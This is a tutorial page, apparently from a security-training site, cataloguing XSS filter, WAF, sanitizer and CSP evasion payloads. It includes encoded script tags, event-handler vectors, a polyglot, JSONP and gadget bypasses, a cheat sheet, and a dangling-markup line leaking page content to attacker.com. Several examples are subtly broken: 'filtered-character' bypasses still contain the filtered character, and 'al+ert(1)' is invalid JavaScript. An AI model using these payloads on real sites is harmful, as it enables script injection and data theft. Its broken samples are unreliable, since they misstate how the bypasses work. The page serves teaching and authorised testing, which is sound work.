---
title: XSS Evasion Techniques
description: Advanced methods to bypass XSS filters, WAFs, and other security controls
---

import { Tabs, TabsList, TabsTrigger, TabsContent } from "@/components/ui/tabs"
import { Callout } from "@/components/markdown/callout"


Modern web applications implement various security controls to prevent XSS attacks. This section covers techniques to bypass these protections, which is essential knowledge for thorough security testing and understanding the limitations of various defense mechanisms.

<Callout type={"warning"} title={"Ethical Usage"}>
  These techniques should only be used in authorized security testing scenarios. Attempting to bypass security controls without permission is illegal and unethical.
</Callout>

## Understanding XSS Filters

Before discussing evasion techniques, it's important to understand the types of XSS protections commonly implemented:

<Tabs defaultValue={"waf"} className={"pt-5 pb-1"}>
  <TabsList>
    <TabsTrigger value={"waf"}>Web Application Firewalls</TabsTrigger>
    <TabsTrigger value={"sanitizers"}>Input Sanitizers</TabsTrigger>
    <TabsTrigger value={"csp"}>Content Security Policy</TabsTrigger>
    <TabsTrigger value={"browser"}>Browser Protections</TabsTrigger>
  </TabsList>
  <TabsContent value={"waf"}>
    ### Web Application Firewalls (WAFs)
    
    WAFs operate at the network level and inspect HTTP requests for malicious patterns:
    
    - **Rule-based detection**: Blocks requests matching known attack signatures
    - **Heuristic analysis**: Identifies suspicious patterns that may indicate attacks
    - **Rate limiting**: Prevents brute force attempts
    
    Common WAF solutions include Cloudflare, ModSecurity, AWS WAF, and F5 Advanced WAF.
  </TabsContent>
  <TabsContent value={"sanitizers"}>
    ### Input Sanitizers
    
    These are libraries or functions that clean user input:
    
    - **HTML encoding**: Converts special characters to HTML entities
    - **JavaScript escaping**: Escapes quotes and other special characters
    - **Whitelisting**: Only allows specific characters or patterns
    - **Context-aware sanitization**: Applies different rules based on where the input will be used
    
    Examples include DOMPurify, OWASP ESAPI, and framework-specific sanitizers like React's automatic escaping.
  </TabsContent>
  <TabsContent value={"csp"}>
    ### Content Security Policy (CSP)
    
    CSP is a browser security mechanism that restricts which resources can be loaded:
    
    - **script-src**: Controls which scripts can execute
    - **default-src**: Default policy for loading content
    - **unsafe-inline**: When present, allows inline scripts
    - **nonce-based**: Only scripts with matching nonces can execute
    - **hash-based**: Only scripts with matching hashes can execute
    
    CSP is implemented via HTTP headers or meta tags and provides an additional layer of defense.
  </TabsContent>
  <TabsContent value={"browser"}>
    ### Browser Protections
    
    Modern browsers include built-in XSS protections:
    
    - **XSS Auditor** (Chrome, deprecated): Detected and blocked reflected XSS
    - **XSS Filter** (IE/Edge, deprecated): Similar to XSS Auditor
    - **Sanitizing HTML**: Modern browsers implement HTML sanitization APIs
    - **Trusted Types**: Prevents DOM-based XSS in modern browsers
    
    While these protections have evolved over time, many have been replaced by CSP.
  </TabsContent>
</Tabs>

## Basic Evasion Techniques

### Character Encoding Tricks

Many filters look for specific strings like `<script>` or `javascript:`. These can often be bypassed using various encoding techniques:

### HTML Entity Encoding

HTML entities can be used to represent characters:

```html
<!-- Standard script tag -->
<script>alert(1)</script>

<!-- Using HTML decimal entities -->
&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;

<!-- Using HTML hex entities -->
&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;alert(1)&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;
```

Browsers will decode these entities before rendering, potentially bypassing filters that only look for the raw string.

### URL Encoding

URL encoding replaces characters with percent-encoded values:

```
// Standard JavaScript URL
javascript:alert(1)

// URL encoded
javascript%3Aalert%281%29

// Double URL encoded
javascript%253Aalert%25281%2529
```

This can bypass filters that don't properly decode URLs before inspection.

### Unicode Encoding

Unicode provides multiple ways to represent characters:

```html
<!-- Using Unicode escape sequences -->
<script>\u0061\u006c\u0065\u0072\u0074(1)</script>

<!-- Using Unicode normalization -->
<Å¿cript>alert(1)</script> <!-- Using the long s character -->
```

Some filters may not properly handle all Unicode representations.

### Mixed Encoding

Combining different encoding techniques can be particularly effective:

```html
<!-- Mix of HTML entities and Unicode -->
&#x3c;script&#x3e;\u0061\u006c\u0065\u0072\u0074(1)&#x3c;/script&#x3e;
```

This approach can confuse filters that only decode one type of encoding.

### Case Manipulation

Some filters are case-sensitive, allowing bypasses through case variation:

```html
<!-- Standard format -->
<script>alert(1)</script>

<!-- Mixed case -->
<ScRiPt>alert(1)</sCrIpT>

<!-- All uppercase (works in HTML5) -->
<SCRIPT>ALERT(1)</SCRIPT>
```

### Tag Obfuscation

When `<script>` tags are blocked, alternative tags and attributes can be used:

```html
<!-- Using event handlers -->
\\<img src="x" onerror="alert(1)"\\>

\\<body onload="alert(1)"\\>

\\<svg onload="alert(1)"\\>

<!-- Using less common tags -->
\\<iframe srcdoc="\\<script\\>alert(1)\\</script\\>"\\>

\\<math\\>\\<mtext\\>\\<script\\>alert(1)\\</script\\>\\</mtext\\>\\</math\\>
```

## Advanced Evasion Techniques

### Bypassing WAFs

Web Application Firewalls often use signature-based detection that can be evaded:

<Tabs defaultValue={"fragmentation"} className={"pt-5 pb-1"}>
  <TabsList>
    <TabsTrigger value={"fragmentation"}>Payload Fragmentation</TabsTrigger>
    <TabsTrigger value={"polyglots"}>XSS Polyglots</TabsTrigger>
    <TabsTrigger value={"mutations"}>Mutation Techniques</TabsTrigger>
  </TabsList>
  <TabsContent value={"fragmentation"}>
    ### Payload Fragmentation
    
    Split the payload across multiple parameters or requests:
    
    ```javascript
    // Using string concatenation
    \\<script\\>eval(document.URL.substring(43,56))\\</script\\>
    
    // URL: https://example.com/?param"alert(document.domain)"
    
    // Using multiple parameters
    \\<script\\>eval(location.hash.substr(1))\\</script\\>
    
    // URL: https://example.com/page#alert(1)
    ```
    
    This technique can bypass WAFs that don't analyze the full context.
  </TabsContent>
  <TabsContent value={"polyglots"}>
    ### XSS Polyglots
    
    Polyglots are payloads that work in multiple contexts:
    
    ```
    jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk="alert()" )//%0D%0A%0d%0a//\</stYle/\</titLe/\</teXtarEa/\</scRipt/--!\>\x3csvg\x3e\x3csvg\x20onload\x3d\x22alert\x28\x29\x22\x3e\x3c\x2fsvg\x3e\x3e
    ```
    
    This complex payload contains multiple attack vectors and can work in various contexts, increasing the chance of bypassing filters.
  </TabsContent>
  <TabsContent value={"mutations"}>
    ### Mutation Techniques
    
    Modify the payload in ways that browsers will still interpret correctly:
    
    ```html
    <!-- Adding null bytes -->
    \\<script\x00\\>alert(1)\\</script\\>
    
    <!-- Adding comments -->
    \\<script<!--comment-->\\>alert(1)<!--comment-->\\</script\\>
    
    <!-- Using attributes -->
    \\<script x=">" y="\\<"\>alert(1)\\</script\\>
    ```
    
    These mutations can confuse WAF parsers while still being valid in browsers.
  </TabsContent>
</Tabs>

### Bypassing Sanitizers

Input sanitizers often have specific weaknesses that can be exploited:

```html
<!-- Bypassing quote filters -->
\\<img src="x" onerror="alert(1)"\\> <!-- Properly quoted -->

<!-- Bypassing angle bracket filters -->
" onerror="alert(1)" x="

<!-- Bypassing JavaScript keyword filters -->
\\<script\\>window['al'+'ert'](1)\\</script\\>
\\<script\\>eval(atob('YWxlcnQoMSk='))\\</script\\> <!-- Base64 encoded alert(1) -->
```

### Bypassing Content Security Policy

CSP provides strong protection, but there are several bypass techniques:

### JSONP Endpoints

If a trusted domain has JSONP endpoints, they can be exploited:

```html
<!-- If trusted-domain.com is allowed in script-src -->
\\<script src="https://trusted-domain.com/api/jsonp?callback=alert(document.domain)"\\>\\</script\\>
```

The JSONP endpoint will return something like `alert(1)({"data":...})`, executing the alert.

### DOM Clobbering

DOM clobbering exploits the way HTML elements can override JavaScript object properties:

```html
<!-- If the application uses an object like config.timeout -->
\<form id="config"\>\<input name="timeout" value="alert(1)"\>\</form\>

<!-- Now if the application does: -->
<!-- setTimeout(config.timeout, 100); -->
<!-- It will execute alert(1) -->
```

This technique works even with strict CSP because it doesn't involve script injection.

### Dangling Markup Injection

This technique injects incomplete HTML that "dangles" until it captures sensitive information:

```html
\\<img src="https://attacker.com/"\\>

<!-- The rest of the page content gets sent to attacker.com as part of the URL -->
```

While not a direct XSS, this can leak sensitive data even with CSP.

### Script Gadgets

Script gadgets are legitimate JavaScript code that can be repurposed for attacks:

```html
<!-- If the site uses jQuery -->
\\<div data-toggle="tooltip" title="\\<img src=\"x\" onerror=\"alert(1)\"\>"\\>Hover me\\</div\\>

<!-- If the site uses AngularJS -->
\\<div ng-app\\>{{constructor.constructor('alert(1)')()}}\\</div\\>
```

These attacks work because the legitimate JavaScript processes user input in an unsafe way.

## Context-Specific Evasion

Different contexts require different evasion techniques:

### HTML Context Evasion

```html
<!-- When < and > are filtered -->
\\<svg/onload="alert(1)"\\>
\\<svg/onload="alert&#x28;1&#x29;"\\>

<!-- When quotes are filtered -->
\\<svg onload="alert(1)"\\>
```

### JavaScript Context Evasion

```javascript
// When quotes are filtered
alert(String.fromCharCode(88,83,83))

// When parentheses are filtered
onerror=alert`1`

// When alert is filtered
window['al'+'ert'](1)
eval('al'+'ert(1)')
```

### Attribute Context Evasion

```html
{/* When quotes are filtered */}
\\<img src="x" onerror="alert(1)"\\> <!-- Properly quoted -->

{/* When spaces are filtered */}
\\<img/src="x"/onerror="alert(1)"\\>

{/* When equals sign is filtered */}
\\<img src="x" onerror="alert(1)"\\>
```

### URL Context Evasion

```html
{/* When javascript: is filtered */}
\\<a href="java&#115;cript:alert(1)"\\>Click me\\</a\\>
\\<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="\\>Click me\\</a\\>
```

## Filter Bypass Cheat Sheet

Here's a quick reference for common filter bypass techniques:

<Tabs defaultValue={"script-tag"} className={"pt-5 pb-1"}>
  <TabsList>
    <TabsTrigger value={"script-tag"}>Script Tag Bypasses</TabsTrigger>
    <TabsTrigger value={"event-handlers"}>Event Handler Bypasses</TabsTrigger>
    <TabsTrigger value={"js-bypasses"}>JavaScript Bypasses</TabsTrigger>
  </TabsList>
  <TabsContent value={"script-tag"}>
    ### Script Tag Bypasses
    
    ```html
    \\<script\>alert(1)\\</script\\>
    \\<script src="data:,alert(1)"\\>\\</script\\>
    \\<script/x\\>alert(1)\\</script\\>
    \\<script ~~~\\>alert(1)\\</script\\>
    \\<script/src="data:text/javascript,alert(1)"\\>\\</script\\>
    \\<script/src="data:application/javascript,alert(1)"\\>\\</script\\>
    ```
  </TabsContent>
  <TabsContent value={"event-handlers"}>
    ### Event Handler Bypasses
    
    ```html
    \\<img src="x" onerror="alert(1)"\\>
    \\<body onload="alert(1)"\\>
    \\<svg onload="alert(1)"\\>
    \\<input autofocus onfocus="alert(1)"\\>
    \\<iframe onload="alert(1)"\\>\\</iframe\\>
    \\<video src="x" onerror="alert(1)"\\>
    \\<audio src="x" onerror="alert(1)"\\>
    ```
  </TabsContent>
  <TabsContent value={"js-bypasses"}>
    ### JavaScript Bypasses
    
    ```javascript
    // String concatenation
    alert(1)
    al+ert(1)
    window['al'+'ert'](1)
    
    // Encoding
    \u0061\u006c\u0065\u0072\u0074(1)
    
    // Evaluation
    eval('alert(1)')
    Function('alert(1)')()
    setTimeout('alert(1)',0)
    setInterval('alert(1)',0)
    
    // Base64
    eval(atob('YWxlcnQoMSk='))
    ```
  </TabsContent>
</Tabs>

## Practical Evasion Examples

### Case Study: Bypassing a Basic WAF

<Callout type={"info"} title={"Scenario"}>
  A web application has implemented a WAF that blocks requests containing `<script>`, `alert`, and `onerror`.
</Callout>

**Evasion approach:**

1. Use an alternative event handler:
   ```html
   <img src="x" onmouseover="prompt(1)">
   ```

2. Use HTML encoding:
   ```html
   <img src="x" &#111;&#110;&#101;&#114;&#114;&#111;&#114;="&#97;&#108;&#101;&#114;&#116;(1)">
   ```

3. Use JavaScript obfuscation:
   ```html
   <img src="x" oninput="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
   ```

### Case Study: Bypassing CSP

<Callout type={"info"} title={"Scenario"}>
  A web application has implemented CSP with the following header:
  `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com/`
</Callout>

**Evasion approach:**

1. Look for JSONP endpoints on trusted domains:
   ```html
   \<script src="https://trusted-cdn.com/api/jsonp?callback=alert(document.domain)"\>\</script\>
   ```

2. Use DOM-based attacks that don't require script execution:
   ```html
   \<a href="javascript:alert(1)"\>Click me\</a\>
   ```

3. Exploit client-side template injection if a framework is used:
   ```html
   \<div data-bind="html: '\<img src=\"x\" onerror=\"alert(1)\"\>'" \>\</div\>
   ```

## Defensive Considerations

Understanding these evasion techniques is crucial for building effective defenses:

- **Use context-aware sanitization**: Different contexts require different sanitization approaches
- **Implement defense in depth**: Combine multiple protection mechanisms
- **Keep security controls updated**: New evasion techniques emerge regularly
- **Test thoroughly**: Regular penetration testing can identify bypass vulnerabilities
- **Monitor for attacks**: Implement logging and alerting for potential XSS attempts

<Callout type={"warning"} title={"Evolution of Attacks"}>
  XSS evasion techniques continue to evolve as security controls improve. Staying updated on the latest techniques is essential for both attackers and defenders.
</Callout>

In the next section, we'll explore defense and mitigation strategies to protect against XSS attacks, including those using the evasion techniques discussed here.
